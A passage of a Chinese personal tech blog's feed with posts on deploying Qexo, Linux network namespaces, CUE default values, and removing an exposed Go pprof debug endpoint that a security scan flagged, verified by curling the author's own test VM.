auth.0008_alter_user_username_max_length... OK<br>  Applying auth.0009_alter_user_last_name_max_length... OK<br>  Applying auth.0010_alter_group_name_max_length... OK<br>  Applying auth.0011_update_proxy_permissions... OK<br>  Applying auth.0012_alter_user_first_name_max_length... OK<br>  Applying hexoweb.0001_initial... OK<br>  Applying hexoweb.0002_postmodel... OK<br>  Applying hexoweb.0003_imagemodel_deleteconfig... OK<br>  Applying sessions.0001_initial... OK<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 manage.py runserver --noreload</span><br>获取本地配置文件成功, 使用本地数据库配置<br>Performing system checks...<br><br>[02/Nov/2024 11:29:55] ERROR: Language获取失败, 默认为zh_CN(functions.py.&lt;module&gt;[line:60])<br>[02/Nov/2024 11:29:55] ERROR: 获取PROVIDER时出错: 跳过(functions.py.&lt;module&gt;[line:79])<br>           _               _ <br>     /\   | |             | |<br>    /  \  | |__  _   _  __| |_   _ <br>   / /\ \ | |_ \| | | |/ _| | | | |<br>  / ____ \| |_) | |_| | (_| | |_| |<br> /_/    \_\____/ \____|\____|\____|<br>当前环境: 本地<br>System check identified no issues (0 silenced).<br>November 02, 2024 - 11:29:55<br>Django version 3.2.25, using settings <span class="hljs-string">&#x27;core.settings&#x27;</span><br>Starting development server at http://127.0.0.1:8000/<br>Quit the server with CONTROL-C.<br></code></pre></td></tr></table></figure><h3 id="成功啦"><a href="#成功啦" class="headerlink" title="成功啦~"></a>成功啦~</h3><p>上面这样只能跑在127.0.0.1，下面这样可以跑在0.0.0.0上</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">[root<span class="hljs-meta">@ningan</span> Qexo-3.4.1]<span class="hljs-comment"># python3.8 manage.py runserver 0.0.0.0:8000 --noreload</span><br>获取本地配置文件成功, 使用本地数据库配置<br>Performing system checks...<br><br>[02/Nov/2024 11:37:14] ERROR: 获取PROVIDER时出错: 跳过(functions.py.<span class="hljs-variable">&lt;module&gt;</span>[line:79])<br>           _               _ <br>     /\   |<span class="hljs-string"> </span>|<span class="hljs-string">             </span>|<span class="hljs-string"> </span>|<br>    /  \  |<span class="hljs-string"> </span>|<span class="hljs-string">__  _   _  __</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_   _ </span><br><span class="hljs-string">   / /\ \ </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/ _</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<br>  / ____ \|<span class="hljs-string"> </span>|<span class="hljs-string">_) </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> (_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<br> /_/    \_\____/ \____|<span class="hljs-string">\____</span>|<span class="hljs-string">\____</span>|<br>当前环境: 本地<br>System check identified no issues (0 silenced).<br>November 02, 2024 - 11:37:14<br>Django version 3.2.25, using settings &#x27;core.settings&#x27;<br>Starting development server at http://0.0.0.0:8000/<br>Quit the server with CONTROL-C.<br></code></pre></td></tr></table></figure><p>访问我虚拟机的地址：192.168.20.201:8000</p><p>设置用户和github中博客私有仓库的地址github.io&#x2F;blog，登录进来就能看到下面的页面啦~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241102114409.png" alt="image.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://bakar.moe/linux-hexo-qexo/">在服务器上部署Hexo+Qexo</a></p>]]></content>
    
    
    <categories>
      
      <category>hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【网络成长记】xxx</title>
    <link href="/2024/10/31/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91xxx/"/>
    <url>/2024/10/31/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91xxx/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># ip netns list</span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># ip netns help</span><br>Usage: ip netns list<br>       ip netns add NAME<br>       ip netns <span class="hljs-built_in">set</span> NAME NETNSID<br>       ip [-all] netns delete [NAME]<br>       ip netns identify [PID]<br>       ip netns pids NAME<br>       ip [-all] netns <span class="hljs-built_in">exec</span> [NAME] cmd ...<br>       ip netns monitor<br>       ip netns list-id<br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># ip netns add netns1</span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># ip netns exec netns1 ip a </span><br>1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># ip netns exec netns1 ip link list</span><br>1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN mode DEFAULT group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># ip netns list</span><br>netns1<br><br><br><br><br><br><br>[root@ningan ~]<span class="hljs-comment"># ip netns exec netns1 ping 127.0.0.1</span><br>connect: Network is unreachable<br>[root@ningan ~]<span class="hljs-comment"># ip netns exec netns1 ip link set dev lo up</span><br>[root@ningan ~]<span class="hljs-comment"># ip netns exec netns1 ip link list</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>[root@ningan ~]<span class="hljs-comment"># ip netns exec netns1 ping 127.0.0.1</span><br>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.<br>64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.013 ms<br>64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.022 ms<br>^C<br>--- 127.0.0.1 ping statistics ---<br>2 packets transmitted, 2 received, 0% packet loss, time 1024ms<br>rtt min/avg/max/mdev = 0.013/0.017/0.022/0.006 ms<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># ip link add veth0 type veth peer name veth1</span><br>[root@ningan ~]<span class="hljs-comment"># ip link set veth1 netns netns1</span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># ip netns exec netns1 ifconfig veth1 10.1.1.1/24 up</span><br>[root@ningan ~]<span class="hljs-comment"># ifconfig veth0 10.1.1.2/24 up</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【cue语言系列】(202410) cue中默认值该如何设置？</title>
    <link href="/2024/10/30/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202410)%20cue%E4%B8%AD%E9%BB%98%E8%AE%A4%E5%80%BC%E8%AF%A5%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%EF%BC%9F/"/>
    <url>/2024/10/30/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202410)%20cue%E4%B8%AD%E9%BB%98%E8%AE%A4%E5%80%BC%E8%AF%A5%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="场景1：默认值设置为读取a变量的值，a存在"><a href="#场景1：默认值设置为读取a变量的值，a存在" class="headerlink" title="场景1：默认值设置为读取a变量的值，a存在"></a>场景1：默认值设置为读取a变量的值，a存在</h2><p>输入：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">global:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">  a:</span> <span class="hljs-string">&quot;aaa&quot;</span><br><span class="hljs-symbol">  b:</span> *<span class="hljs-string">&quot;\(global.a)&quot;</span> | <span class="hljs-string">&quot;bbb&quot;</span><br><span class="hljs-symbol">  c:</span> <span class="hljs-string">&quot;\(global.b)&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">global:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">a:</span> <span class="hljs-string">&quot;aaa&quot;</span><br><span class="hljs-symbol">b:</span> <span class="hljs-string">&quot;aaa&quot;</span><br><span class="hljs-symbol">c:</span> <span class="hljs-string">&quot;aaa&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="场景1：默认值设置为读取a变量的值，a不存在"><a href="#场景1：默认值设置为读取a变量的值，a不存在" class="headerlink" title="场景1：默认值设置为读取a变量的值，a不存在"></a>场景1：默认值设置为读取a变量的值，a不存在</h2><p>输入：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">global: &#123;<br>  <span class="hljs-selector-tag">b</span>: *<span class="hljs-string">&quot;\(global.a)&quot;</span> | <span class="hljs-string">&quot;bbb&quot;</span><br>  c: <span class="hljs-string">&quot;\(global.b)&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">global: &#123;<br><span class="hljs-selector-tag">b</span>: <span class="hljs-string">&quot;bbb&quot;</span><br>c: <span class="hljs-string">&quot;bbb&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【go语言系列】(202410) go语言中httpServer的pprof漏洞如何避免</title>
    <link href="/2024/10/23/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202410)%20go%E8%AF%AD%E8%A8%80%E4%B8%ADhttpServer%E7%9A%84pprof%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D/"/>
    <url>/2024/10/23/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202410)%20go%E8%AF%AD%E8%A8%80%E4%B8%ADhttpServer%E7%9A%84pprof%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>工作中写的一个go代码被安全中心检查出来了pprof漏洞，想要避免这个问题，故做了如下实验。</p><h1 id="解决方案1：直接去掉pprof"><a href="#解决方案1：直接去掉pprof" class="headerlink" title="解决方案1：直接去掉pprof"></a>解决方案1：直接去掉pprof</h1><h2 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h2><p>左边的代码没有pprof包，右边的代码有pprof包，两边各起了两个httpServer</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241023115400.png" alt="image.png"></p><p>分别开两个shell启动进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># go run hEqual1/main.go -a=&quot;0.0.0.0:6010&quot; -b=&quot;0.0.0.0:6011&quot; </span><br>2024/10/22 06:36:47 Starting server on  0.0.0.0:6010<br>2024/10/22 06:36:47 Starting server on  0.0.0.0:6011<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># go run hEqual0/main.go -a=&quot;0.0.0.0:6020&quot; -b=&quot;0.0.0.0:6021&quot; </span><br>2024/10/22 06:37:05 Starting server on  0.0.0.0:6020<br>2024/10/22 06:37:05 Starting server on  0.0.0.0:6021<br><br></code></pre></td></tr></table></figure><p>校验结果：<br>有pprof包的结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan chapter58-httpserver]<span class="hljs-comment"># curl http://192.168.20.201:6010/debug/pprof/goroutine?debug=1</span><br>goroutine profile: total 4<br>1 @ 0x430fd1 0x467fbd 0x661411 0x661245 0x65dce6 0x66f2e8 0x66fde5 0x61dee9 0x61f802 0x6204ae 0x61cd14 0x46d821<br><span class="hljs-comment">#       0x467fbc        runtime/pprof.runtime_goroutineProfileWithLabels+0x1c   /usr/local/go/src/runtime/mprof.go:844</span><br><span class="hljs-comment">#       0x661410        runtime/pprof.writeRuntimeProfile+0xb0                  /usr/local/go/src/runtime/pprof/pprof.go:734</span><br><span class="hljs-comment">#       0x661244        runtime/pprof.writeGoroutine+0x44                       /usr/local/go/src/runtime/pprof/pprof.go:694</span><br><span class="hljs-comment">#       0x65dce5        runtime/pprof.(*Profile).WriteTo+0x145                  /usr/local/go/src/runtime/pprof/pprof.go:329</span><br><span class="hljs-comment">#       0x66f2e7        net/http/pprof.handler.ServeHTTP+0x4a7                  /usr/local/go/src/net/http/pprof/pprof.go:267</span><br><span class="hljs-comment">#       0x66fde4        net/http/pprof.Index+0xe4                               /usr/local/go/src/net/http/pprof/pprof.go:384</span><br><span class="hljs-comment">#       0x61dee8        net/http.HandlerFunc.ServeHTTP+0x28                     /usr/local/go/src/net/http/server.go:2136</span><br><span class="hljs-comment">#       0x61f801        net/http.(*ServeMux).ServeHTTP+0x141                    /usr/local/go/src/net/http/server.go:2514</span><br><span class="hljs-comment">#       0x6204ad        net/http.serverHandler.ServeHTTP+0x8d                   /usr/local/go/src/net/http/server.go:2938</span><br><span class="hljs-comment">#       0x61cd13        net/http.(*conn).serve+0x5f3                            /usr/local/go/src/net/http/server.go:2009</span><br><br>1 @ 0x43bb8e 0x434597 0x468385 0x4b2da7 0x4b38fa 0x4b38e8 0x5581a5 0x562125 0x616c57 0x46d821<br><span class="hljs-comment">#       0x468384        internal/poll.runtime_pollWait+0x84             /usr/local/go/src/runtime/netpoll.go:343</span><br><span class="hljs-comment">#       0x4b2da6        internal/poll.(*pollDesc).wait+0x26             /usr/local/go/src/internal/poll/fd_poll_runtime.go:84</span><br><span class="hljs-comment">#       0x4b38f9        internal/poll.(*pollDesc).waitRead+0x279        /usr/local/go/src/internal/poll/fd_poll_runtime.go:89</span><br><span class="hljs-comment">#       0x4b38e7        internal/poll.(*FD).Read+0x267                  /usr/local/go/src/internal/poll/fd_unix.go:164</span><br><span class="hljs-comment">#       0x5581a4        net.(*netFD).Read+0x24                          /usr/local/go/src/net/fd_posix.go:55</span><br><span class="hljs-comment">#       0x562124        net.(*conn).Read+0x44                           /usr/local/go/src/net/net.go:179</span><br><span class="hljs-comment">#       0x616c56        net/http.(*connReader).backgroundRead+0x36      /usr/local/go/src/net/http/server.go:683</span><br><br>1 @ 0x43bb8e 0x434597 0x468385 0x4b2da7 0x4b446c 0x4b445a 0x5592e9 0x56965e 0x568970 0x620904 0x620571 0x6774dd 0x677489 0x43b71b 0x46d821<br><span class="hljs-comment">#       0x468384        internal/poll.runtime_pollWait+0x84             /usr/local/go/src/runtime/netpoll.go:343</span><br><span class="hljs-comment">#       0x4b2da6        internal/poll.(*pollDesc).wait+0x26             /usr/local/go/src/internal/poll/fd_poll_runtime.go:84</span><br><span class="hljs-comment">#       0x4b446b        internal/poll.(*pollDesc).waitRead+0x2ab        /usr/local/go/src/internal/poll/fd_poll_runtime.go:89</span><br><span class="hljs-comment">#       0x4b4459        internal/poll.(*FD).Accept+0x299                /usr/local/go/src/internal/poll/fd_unix.go:611</span><br><span class="hljs-comment">#       0x5592e8        net.(*netFD).accept+0x28                        /usr/local/go/src/net/fd_unix.go:172</span><br><span class="hljs-comment">#       0x56965d        net.(*TCPListener).accept+0x1d                  /usr/local/go/src/net/tcpsock_posix.go:152</span><br><span class="hljs-comment">#       0x56896f        net.(*TCPListener).Accept+0x2f                  /usr/local/go/src/net/tcpsock.go:315</span><br><span class="hljs-comment">#       0x620903        net/http.(*Server).Serve+0x363                  /usr/local/go/src/net/http/server.go:3056</span><br><span class="hljs-comment">#       0x620570        net/http.(*Server).ListenAndServe+0x70          /usr/local/go/src/net/http/server.go:2985</span><br><span class="hljs-comment">#       0x6774dc        net/http.ListenAndServe+0x2bc                   /usr/local/go/src/net/http/server.go:3239</span><br><span class="hljs-comment">#       0x677488        main.main+0x268                                 /root/go-practice/chapter58-httpserver/hEqual1/main.go:42</span><br><span class="hljs-comment">#       0x43b71a        runtime.main+0x2ba                              /usr/local/go/src/runtime/proc.go:267</span><br><br>1 @ 0x43bb8e 0x434597 0x468385 0x4b2da7 0x4b446c 0x4b445a 0x5592e9 0x56965e 0x568970 0x620904 0x620571 0x677745 0x6776ec 0x46d821<br><span class="hljs-comment">#       0x468384        internal/poll.runtime_pollWait+0x84             /usr/local/go/src/runtime/netpoll.go:343</span><br><span class="hljs-comment">#       0x4b2da6        internal/poll.(*pollDesc).wait+0x26             /usr/local/go/src/internal/poll/fd_poll_runtime.go:84</span><br><span class="hljs-comment">#       0x4b446b        internal/poll.(*pollDesc).waitRead+0x2ab        /usr/local/go/src/internal/poll/fd_poll_runtime.go:89</span><br><span class="hljs-comment">#       0x4b4459        internal/poll.(*FD).Accept+0x299                /usr/local/go/src/internal/poll/fd_unix.go:611</span><br><span class="hljs-comment">#       0x5592e8        net.(*netFD).accept+0x28                        /usr/local/go/src/net/fd_unix.go:172</span><br><span class="hljs-comment">#       0x56965d        net.(*TCPListener).accept+0x1d                  /usr/local/go/src/net/tcpsock_posix.go:152</span><br><span class="hljs-comment">#       0x56896f        net.(*TCPListener).Accept+0x2f                  /usr/local/go/src/net/tcpsock.go:315</span><br><span class="hljs-comment">#       0x620903        net/http.(*Server).Serve+0x363                  /usr/local/go/src/net/http/server.go:3056</span><br><span class="hljs-comment">#       0x620570        net/http.(*Server).ListenAndServe+0x70          /usr/local/go/src/net/http/server.go:2985</span><br><span class="hljs-comment">#       0x677744        net/http.ListenAndServe+0x1a4                   /usr/local/go/src/net/http/server.go:3239</span><br><span class="hljs-comment">#       0x6776eb        main.main.func1+0x14b                           /root/go-practice/chapter58-httpserver/hEqual1/main.go:34</span><br><br>[root@ningan chapter58-httpserver]<span class="hljs-comment"># </span><br>[root@ningan chapter58-httpserver]<span class="hljs-comment"># </span><br>[root@ningan chapter58-httpserver]<span class="hljs-comment"># </span><br>[root@ningan chapter58-httpserver]<span class="hljs-comment"># curl http://192.168.20.201:6011/debug/pprof/goroutine?debug=1</span><br>goroutine profile: total 4<br>1 @ 0x430fd1 0x467fbd 0x661411 0x661245 0x65dce6 0x66f2e8 0x66fde5 0x61dee9 0x61f802 0x6204ae 0x61cd14 0x46d821<br><span class="hljs-comment">#       0x467fbc        runtime/pprof.runtime_goroutineProfileWithLabels+0x1c   /usr/local/go/src/runtime/mprof.go:844</span><br><span class="hljs-comment">#       0x661410        runtime/pprof.writeRuntimeProfile+0xb0                  /usr/local/go/src/runtime/pprof/pprof.go:734</span><br><span class="hljs-comment">#       0x661244        runtime/pprof.writeGoroutine+0x44                       /usr/local/go/src/runtime/pprof/pprof.go:694</span><br><span class="hljs-comment">#       0x65dce5        runtime/pprof.(*Profile).WriteTo+0x145                  /usr/local/go/src/runtime/pprof/pprof.go:329</span><br><span class="hljs-comment">#       0x66f2e7        net/http/pprof.handler.ServeHTTP+0x4a7                  /usr/local/go/src/net/http/pprof/pprof.go:267</span><br><span class="hljs-comment">#       0x66fde4        net/http/pprof.Index+0xe4                               /usr/local/go/src/net/http/pprof/pprof.go:384</span><br><span class="hljs-comment">#       0x61dee8        net/http.HandlerFunc.ServeHTTP+0x28                     /usr/local/go/src/net/http/server.go:2136</span><br><span class="hljs-comment">#       0x61f801        net/http.(*ServeMux).ServeHTTP+0x141                    /usr/local/go/src/net/http/server.go:2514</span><br><span class="hljs-comment">#       0x6204ad        net/http.serverHandler.ServeHTTP+0x8d                   /usr/local/go/src/net/http/server.go:2938</span><br><span class="hljs-comment">#       0x61cd13        net/http.(*conn).serve+0x5f3                            /usr/local/go/src/net/http/server.go:2009</span><br><br>1 @ 0x43bb8e 0x434597 0x468385 0x4b2da7 0x4b446c 0x4b445a 0x5592e9 0x56965e 0x568970 0x620904 0x620571 0x6774dd 0x677489 0x43b71b 0x46d821<br><span class="hljs-comment">#       0x468384        internal/poll.runtime_pollWait+0x84             /usr/local/go/src/runtime/netpoll.go:343</span><br><span class="hljs-comment">#       0x4b2da6        internal/poll.(*pollDesc).wait+0x26             /usr/local/go/src/internal/poll/fd_poll_runtime.go:84</span><br><span class="hljs-comment">#       0x4b446b        internal/poll.(*pollDesc).waitRead+0x2ab        /usr/local/go/src/internal/poll/fd_poll_runtime.go:89</span><br><span class="hljs-comment">#       0x4b4459        internal/poll.(*FD).Accept+0x299                /usr/local/go/src/internal/poll/fd_unix.go:611</span><br><span class="hljs-comment">#       0x5592e8        net.(*netFD).accept+0x28                        /usr/local/go/src/net/fd_unix.go:172</span><br><span class="hljs-comment">#       0x56965d        net.(*TCPListener).accept+0x1d                  /usr/local/go/src/net/tcpsock_posix.go:152</span><br><span class="hljs-comment">#       0x56896f        net.(*TCPListener).Accept+0x2f                  /usr/local/go/src/net/tcpsock.go:315</span><br><span class="hljs-comment">#       0x620903        net/http.(*Server).Serve+0x363                  /usr/local/go/src/net/http/server.go:3056</span><br><span class="hljs-comment">#       0x620570        net/http.(*Server).ListenAndServe+0x70          /usr/local/go/src/net/http/server.go:2985</span><br><span class="hljs-comment">#       0x6774dc        net/http.ListenAndServe+0x2bc                   /usr/local/go/src/net/http/server.go:3239</span><br><span class="hljs-comment">#       0x677488        main.main+0x268                                 /root/go-practice/chapter58-httpserver/hEqual1/main.go:42</span><br><span class="hljs-comment">#       0x43b71a        runtime.main+0x2ba                              /usr/local/go/src/runtime/proc.go:267</span><br><br>1 @ 0x43bb8e 0x434597 0x468385 0x4b2da7 0x4b446c 0x4b445a 0x5592e9 0x56965e 0x568970 0x620904 0x620571 0x677745 0x6776ec 0x46d821<br><span class="hljs-comment">#       0x468384        internal/poll.runtime_pollWait+0x84             /usr/local/go/src/runtime/netpoll.go:343</span><br><span class="hljs-comment">#       0x4b2da6        internal/poll.(*pollDesc).wait+0x26             /usr/local/go/src/internal/poll/fd_poll_runtime.go:84</span><br><span class="hljs-comment">#       0x4b446b        internal/poll.(*pollDesc).waitRead+0x2ab        /usr/local/go/src/internal/poll/fd_poll_runtime.go:89</span><br><span class="hljs-comment">#       0x4b4459        internal/poll.(*FD).Accept+0x299                /usr/local/go/src/internal/poll/fd_unix.go:611</span><br><span class="hljs-comment">#       0x5592e8        net.(*netFD).accept+0x28                        /usr/local/go/src/net/fd_unix.go:172</span><br><span class="hljs-comment">#       0x56965d        net.(*TCPListener).accept+0x1d                  /usr/local/go/src/net/tcpsock_posix.go:152</span><br><span class="hljs-comment">#       0x56896f        net.(*TCPListener).Accept+0x2f                  /usr/local/go/src/net/tcpsock.go:315</span><br><span class="hljs-comment">#       0x620903        net/http.(*Server).Serve+0x363                  /usr/local/go/src/net/http/server.go:3056</span><br><span class="hljs-comment">#       0x620570        net/http.(*Server).ListenAndServe+0x70          /usr/local/go/src/net/http/server.go:2985</span><br><span class="hljs-comment">#       0x677744        net/http.ListenAndServe+0x1a4                   /usr/local/go/src/net/http/server.go:3239</span><br><span class="hljs-comment">#       0x6776eb        main.main.func1+0x14b                           /root/go-practice/chapter58-httpserver/hEqual1/main.go:34</span><br><br>1 @ 0x46d821<br><br></code></pre></td></tr></table></figure><p>无pprof包的结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan chapter58-httpserver]<span class="hljs-comment"># curl http://192.168.20.201:6020/debug/pprof/goroutine?debug=1</span><br>404 page not found<br>[root@ningan chapter58-httpserver]<span class="hljs-comment"># curl http://192.168.20.201:6021/debug/pprof/goroutine?debug=1</span><br>404 page not found<br></code></pre></td></tr></table></figure><p>结果证明，只要把引用的pprof包删除，便可以解决这个问题~</p><h1 id="解决方案2"><a href="#解决方案2" class="headerlink" title="解决方案2"></a>解决方案2</h1><p>正常服务端口改为http.NewServeMux</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241023172345.png" 